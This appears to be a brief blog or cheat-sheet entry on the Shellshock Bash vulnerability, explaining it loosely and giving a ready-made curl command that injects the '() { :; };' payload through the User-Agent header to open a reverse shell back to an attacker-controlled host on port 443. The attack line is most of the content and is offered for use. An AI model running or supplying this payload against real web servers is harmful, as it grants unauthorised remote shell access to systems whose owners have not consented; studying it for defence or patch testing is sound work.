# [](#header-4)ShellShock Attack
This vulnerability in Bash allows remote code execution without confirmation. A series of random characters, () { :; }; , confuses Bash because it doesn't know what to do with them, so by default, it executes the code after it.

We can manipulate the **User-agent** to execute it, for example:
{% highlight plain %}
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/myip/443 0>&1" http://example.com/
{% endhighlight %}
